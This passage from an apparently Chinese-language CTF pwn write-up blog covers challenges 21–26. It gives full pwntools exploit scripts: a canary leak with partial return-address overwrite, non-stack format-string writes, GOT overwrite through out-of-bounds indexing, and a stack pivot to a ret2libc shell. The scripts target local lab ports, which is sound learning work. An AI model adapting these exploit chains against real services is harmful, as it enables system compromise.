class="hljs-string">&#x27;printf&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0x50a47</span><br>pop_rcx = <span class="hljs-number">0x000000000003d1ee</span> + libc_base<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">payload = p64(puts_addr)+p64(printf_addr)+p64(one_gadget)*4+p64(pop_rcx)+p64(0)+p64(main_addr)</span><br><span class="hljs-string">sd(payload)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = p64(bss_got)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x200</span>)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br><br>rl()<br>payload = <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x30</span>+p64(one_gadget)<br>sd(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="21-read-once-twice"><a href="#21-read-once-twice" class="headerlink" title="21 read_once_twice"></a>21 read_once_twice</h4><p>保护全开，<del>格式化字符串漏洞</del>，栈溢出，有后门。</p>
+<p>调试看距离太没挑战性了，直接来一波手算(也没啥挑战性，回顾一下计算)</p>
+<p>canary的距离：(0x20-0x8)&#x2F;0x8+5&#x3D;8</p>
+<p>ret到的main（0x1302）:8+2&#x3D;10</p>
+<p>（嘶看错了，是puts不是printf…莫得格式化字符串）</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409231721115.png" srcset="/img/loading.gif" lazyload alt="image-20240923172144970"></p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409231723508.png" srcset="/img/loading.gif" lazyload alt="image-20240923172349442"></p>
+<p>vuln后返回的地址</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409231724679.png" srcset="/img/loading.gif" lazyload alt="image-20240923172434575"></p>
+<p>第一次泄露canary，第二次覆盖返回地址后三位为main的开始就可以二次打。（因为后3位相同），不过发现后门的第一位也是1，跟main相同，直接覆盖到后门就行了。不对，一次只能覆盖四位。。。那就一直爆最后一位。（该exp就是不断手动尝试执行，直到刚好倒数第4位对应的偏移为0是成功）</p>
+<p>exp：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./twice&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46285</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>back_addr = <span class="hljs-number">0x11AA</span><br><br>payload = b<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>)+b<span class="hljs-string">&#x27;B&#x27;</span><br>sd(payload)<br>ru(<span class="hljs-string">&#x27;AB&#x27;</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))*<span class="hljs-number">0x100</span><br>print(hex(canary))<br><br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>)+p64(canary)*<span class="hljs-number">2</span>+p16(back_addr)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="22-where-is-fmt"><a href="#22-where-is-fmt" class="headerlink" title="22 where is  fmt"></a>22 where is  fmt</h4><p>非栈上格式化字符串修改返回地址</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409241304481.png" srcset="/img/loading.gif" lazyload alt="image-20240924130451316"></p>
+<p>先泄露栈地址</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409241305339.png" srcset="/img/loading.gif" lazyload alt="image-20240924130506293"></p>
+<p>再找到可以利用的链</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409241317602.png" srcset="/img/loading.gif" lazyload alt="image-20240924131709522"></p>
+<p>stack1偏移为8</p>
+<p>stack2偏移为15</p>
+<p>stack3偏移为33（x）这里不是十进制数啊。。。0x27&#x3D;39,39+6&#x3D;45</p>
+<p>结束。。。还以为那里的变量不能动来着，结果是算错了这种低级错误。。。</p>
+<p>exp:</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./wherefmt&#x27;)<br>p=remote(&#x27;127.0.0.1&#x27;,35513)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>back_addr = 0x401202<br><br>payload = b&#x27;%8$p&#x27;<br><br>sd(payload)<br><br>ru(b&#x27;0x&#x27;)<br>stack1_addr = int(rc(12),16)-0x8<br>print(hex(stack1_addr))<br>stack2_addr = stack1_addr + 0x30<br>stack3_addr = stack1_addr + 0x120<br>stack_num = stack1_addr - 0x10 +5<br>offset = stack1_addr &amp; 0xffff<br>payload = &#x27;%&#x27; + str(offset) + &#x27;c&#x27; +&#x27;%15$hn&#x27;<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">print</span><span class="hljs-params">(<span class="hljs-variable">payload</span>)</span><br>sd(payload)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><br>payload = &#x27;%2c%45$hhn\x00&#x27;<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="23-got-it"><a href="#23-got-it" class="headerlink" title="23 got it"></a>23 got it</h4><p>保护近乎于全开</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242146176.png" srcset="/img/loading.gif" lazyload alt="image-20240924214624115"></p>
+<p>bss段上又16个saves，每个8字节，可以选择对里面的一个saves加减乘除，也可以全部打印</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242152752.png" srcset="/img/loading.gif" lazyload alt="image-20240924215223707"></p>
+<p>（可以用负数选择对saves以外的地址进行操作，但是不能进行直接打印）</p>
+<p>实在想不出来怎么用，提示，启动；欸？已知的知识点啊。。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242204889.png" srcset="/img/loading.gif" lazyload alt="image-20240924220455842"></p>
+<p>等等，puts这里打印出了b，也就是说，，，，也可以是bin_sh？</p>
+<p>喵喵喵，感谢提示</p>
+<p>emm这样子打印不出来，得写到一起。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242219067.png" srcset="/img/loading.gif" lazyload alt="image-20240924221921031"></p>
+<p>注意要小端序</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242225620.png" srcset="/img/loading.gif" lazyload alt="image-20240924222519585"></p>
+<p>saves与puts的距离：0x80</p>
+<p>0x80&#x2F;8&#x3D;16</p>
+<p>原本想着-16为啥不行，动调发现rax结果很奇怪，奥，%u，无符号数。。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409242300702.png" srcset="/img/loading.gif" lazyload alt="image-20240924230012647"></p>
+<p>真正输入-16之后，在*8后不为真正的数值，暂时陷入未知，写个c看看</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251329369.png" srcset="/img/loading.gif" lazyload alt="image-20240925132933235"></p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251330705.png" srcset="/img/loading.gif" lazyload alt="image-20240925133056672"></p>
+<p>这里可以看到，-128被作为了0xffffff80</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251333138.png" srcset="/img/loading.gif" lazyload alt="image-20240925133339075"></p>
+<p>但是，奇奇怪怪。。。输出rax的结果与输出单纯值的结果会不同。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251345608.png" srcset="/img/loading.gif" lazyload alt="image-20240925134519563"></p>
+<p>但是这样子就可以看到-16了</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251356927.png" srcset="/img/loading.gif" lazyload alt="image-20240925135645893"></p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251405976.png" srcset="/img/loading.gif" lazyload alt="image-20240925140543938"></p>
+<p>看样子应该是符号扩展的问题</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251405873.png" srcset="/img/loading.gif" lazyload alt="image-20240925140532813"></p>
+<p>但是v1只有4个字节，无法把高位扩展到。。</p>
+<p>不对，扩展不会只扩展这么少，应该是相乘后就是这个值。</p>
+<p>那直接使得相乘后是这个值呢</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251619894.png" srcset="/img/loading.gif" lazyload alt="image-20240925161900785"></p>
+<p>还是不行，就得是</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251623048.png" srcset="/img/loading.gif" lazyload alt="image-20240925162331012"></p>
+<p>欸，只想着往上扩展，可以往下越界，从正数越界多好越啊，越到now_saves，然后改不就得了。。。。光想着负数溢出了，还有正数的越界啊，又被固有思维限制了。。</p>
+<p>直接越界到now_save，自己指向自己，相减修改到puts_got的位置，再减去对应的偏移。</p>
+<p>注意，写bin_sh写习惯了，实际是&#x2F;bin&#x2F;sh，或者直接sh就好。。。</p>
+<p>exp:</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./gotit&#x27;)<br>p=remote(&#x27;127.0.0.1&#x27;,33571)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>def numbers(nums,times):<br>    rl()<br>    nums = str(ord(nums))<br>    sl(b&#x27;1&#x27;)<br>    rl()<br>    sl(times)<br>    rl()<br>    sl(b&#x27;1&#x27;)<br>    sl(nums)<br>    sl(b&#x27;5&#x27;)<br><br>&#x27;&#x27;&#x27;<br>numbers(&#x27;b&#x27;,&#x27;0&#x27;)<br>numbers(&#x27;i&#x27;,&#x27;1&#x27;)<br>numbers(&#x27;n&#x27;,&#x27;2&#x27;)<br>numbers(&#x27;_&#x27;,&#x27;3&#x27;)<br>numbers(&#x27;s&#x27;,&#x27;4&#x27;)<br>numbers(&#x27;h&#x27;,&#x27;5&#x27;)<br>&#x27;&#x27;&#x27;<br><br><br>rl()<br>sl(b&#x27;1&#x27;)<br>rl()<br>sl(&#x27;0&#x27;)<br>rl()<br>sl(b&#x27;1&#x27;)<br><br>strs=int(&#x27;0x6873&#x27;,16)<br>print(strs)<br>sl(str(strs))<br>sl(b&#x27;5&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><br>rl()<br>sl(b&#x27;1&#x27;)<br>rl()<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">gdb</span>.attach(p,&#x27;b *$rebase(0x12bd)&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">()</span><br>sl(&#x27;16&#x27;)<br><br><br>rl()<br>sl(b&#x27;2&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>offset = 0x100<br>sl(str(offset))<br>sl(b&#x27;2&#x27;)<br><br>offset = libc.sym[&#x27;puts&#x27;]-libc.sym[&#x27;system&#x27;]<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">print</span><span class="hljs-params">(<span class="hljs-keyword">str</span><span class="hljs-params">(<span class="hljs-variable">libc</span>.<span class="hljs-variable">sym</span>[&#x27;<span class="hljs-variable">puts</span>&#x27;])</span>)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">print</span><span class="hljs-params">(<span class="hljs-keyword">str</span><span class="hljs-params">(<span class="hljs-variable">libc</span>.<span class="hljs-variable">sym</span>[&#x27;<span class="hljs-variable">system</span>&#x27;])</span>)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">gdb</span>.attach(p,&#x27;b *$rebase(0x0125c)&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">()</span><br>sl(str(offset))<br>sl(b&#x27;5&#x27;)<br><br>sl(b&#x27;3&#x27;)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="24-栈的奇妙之旅"><a href="#24-栈的奇妙之旅" class="headerlink" title="24 栈的奇妙之旅"></a>24 栈的奇妙之旅</h4><p>16字节你能秒我？一眼栈迁移</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409251710944.png" srcset="/img/loading.gif" lazyload alt="image-20240925171041856"></p>
+<p>没有输出的途径，没有栈地址，只能往bss上迁移。</p>
+<p>注意不能重复在一段上写，否则造成rsp与写的位置重复后，ret到不该ret的位置。</p>
+<p>由于之前是相差0x80，这里手动调整每次rbp-0x80</p>
+<p>好久没打栈迁移了，有些生疏了。。。最后注意栈对齐</p>
+<p>exp：</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./travelstack&#x27;)<br>p=remote(&#x27;127.0.0.1&#x27;,43151)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>vuln_addr = 0x4011e5<br>puts_plt = 0x0401060<br>puts_got = 0x403FD8<br>pop_ret = 0x000000000040101a<br>pop_rdi = 0x4011c5<br>leave_ret = 0x4011FC<br>bss_addr = 0x404800<br><br>payload = b&#x27;A&#x27; * 0x80 + p64(bss_addr) + p64(vuln_addr) <br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>ru(&#x27;kill&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">gdb</span>.attach(p,&#x27;b *0x4011F6&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">(1)</span><br><br>sd(payload)<br><br>payload = p64(bss_addr-0x80) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>payload = payload.ljust(0x80,b&#x27;A&#x27;)<br>payload += p64(bss_addr - 0x80) + p64(leave_ret)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">gdb</span>.attach(p,&#x27;b *0x4011F6&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">(1)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">ru</span><span class="hljs-params">(&#x27;<span class="hljs-variable">kill</span>&#x27;)</span><br>sd(payload)<br>puts_addr = u64(ru(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts_addr))<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>bin_sh = libc_base + next(libc.search(&#x27;/bin/sh&#x27;))<br>system_addr = libc_base + libc.sym[&#x27;system&#x27;]<br><br>payload = p64(bss_addr-0x80) +p64(pop_ret)+ p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(vuln_addr)<br>payload = payload.ljust(0x80,b&#x27;A&#x27;)<br>payload += p64(bss_addr - 0x80*2) + p64(leave_ret)<br><br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="25-one-chance"><a href="#25-one-chance" class="headerlink" title="25 one chance"></a>25 one chance</h4><p>保护全开，有后门，用格式化字符串修改返回地址。由于buf在bss段上，还是非栈上的修改。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301716995.png" srcset="/img/loading.gif" lazyload alt="image-20240930171556825"></p>
+<p>由于vuln的返回地址与后门只差一个字节，只需要改一个字节的返回地址就好。</p>
+<p>又是一场三连的修改，与where is fmt一样。但是这个只能修改一次。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301738979.png" srcset="/img/loading.gif" lazyload alt="image-20240930173858925"></p>
+<p>stack1偏移：6+9 &#x3D; 15</p>
+<p>stack2偏移：6+0x27 &#x3D; 45</p>
+<p>直接合一起改不过去。。。</p>
+<p>看看提示，什么时候解析的。唔，动调看看，只看出在一个std_out函数一键输出了，其他没看出来。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301759505.png" srcset="/img/loading.gif" lazyload alt="image-20240930175952441"></p>
+<p>这里又call了一次</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301805326.png" srcset="/img/loading.gif" lazyload alt="image-20240930180514275"></p>
+<p>这个不知道call了什么</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301806882.png" srcset="/img/loading.gif" lazyload alt="image-20240930180655823"></p>
+<p>经历了漫长的调试，欸？</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301808199.png" srcset="/img/loading.gif" lazyload alt="image-20240930180858145"></p>
+<p>将payload1与payload2交换位置，发现它们两个的修改是同时发生的，不管怎么交换位置，修改的情况一样，，，</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301817555.png" srcset="/img/loading.gif" lazyload alt="image-20240930181703519"></p>
+<p>不应该呀，依稀记得以前的是逐个加的，回头看了一眼以前栈上逐个加的笔记，上一次的%c的个数对下一次是有影响的啊。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301823236.png" srcset="/img/loading.gif" lazyload alt="image-20240930182338158"></p>
+<p>再仔细想想提示，再结合动调的时候发现栈的空间变化，地址是被单独取出来的。也就是说在进入printf的时候，提取了对应位置的栈的地址。</p>
+<p>（貌似是带$的先提取，用%号的后面一点点提取）</p>
+<p>搜了半天参考了这个博客<a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/a523e26a.html">一次有趣的格式化字符串漏洞利用 | ZIKH26’s Blog</a>，发现本题是博客这个题的简化版本。</p>
+<p>成了！</p>
+<p>不过要注意的是，博客里用了%p，输出了9个，每次输出是10个字符，所以减了90，但是我这里由于有的是空的，就不用%p了，用了%c。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./one_chance&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">42119</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>back_addr = <span class="hljs-number">0x1210</span><br>vuln_ret_main = <span class="hljs-number">0x12cf</span><br><br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-comment">#debug()</span><br>vuln_ret_stack = stack_addr + <span class="hljs-number">0x18</span><br>offset1 = vuln_ret_stack &amp; <span class="hljs-number">0xffff</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(offset1))<br>offset2 = <span class="hljs-number">0x10010</span> - offset1<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(offset2))<br><br>payload1 = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(offset1-<span class="hljs-number">13</span>) +<span class="hljs-string">&#x27;c%hn&#x27;</span><br>payload2 = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(offset2) + <span class="hljs-string">&#x27;c%45$hhn&#x27;</span><br>payload = <span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">13</span>+payload1+payload2<br>payload = payload.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="26-goldenwing"><a href="#26-goldenwing" class="headerlink" title="26 goldenwing"></a>26 goldenwing</h4><p>共有4(5)个选项</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031529091.png" srcset="/img/loading.gif" lazyload alt="image-20241003152924020"></p>
+<p>1：显示状态</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031529452.png" srcset="/img/loading.gif" lazyload alt="image-20241003152941385"></p>
+<p>2:加体力和力量（只能一次）血最多+100，攻击最多加10，且只能进行一次。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031530646.png" srcset="/img/loading.gif" lazyload alt="image-20241003153016582"></p>
+<p>3：打怪：</p>
+<p>就是比较攻击与血量互相攻击，不截图了，胜利之后有两次格式化字符串。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031532058.png" srcset="/img/loading.gif" lazyload alt="image-20241003153251959"></p>
+<p>4：退出</p>
+<p>3405691582：god？写入s中，0x20个字节</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031535849.png" srcset="/img/loading.gif" lazyload alt="image-20241003153502787"></p>
+<p>发现状态比较都是无符号整数，直接用-100000增加力量和生命来打败boss</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031549620.png" srcset="/img/loading.gif" lazyload alt="image-20241003154916553"></p>
+<p>magic位于bss端上，非栈上格式化字符串</p>
+<p>6+0x25 &#x3D; 43泄露出libc地址。</p>
+<p>按照题25的思路，第二次输入时将返回的地址改为这个success函数的对i置0的位置，从而实现不限次数的格式化字符串</p>
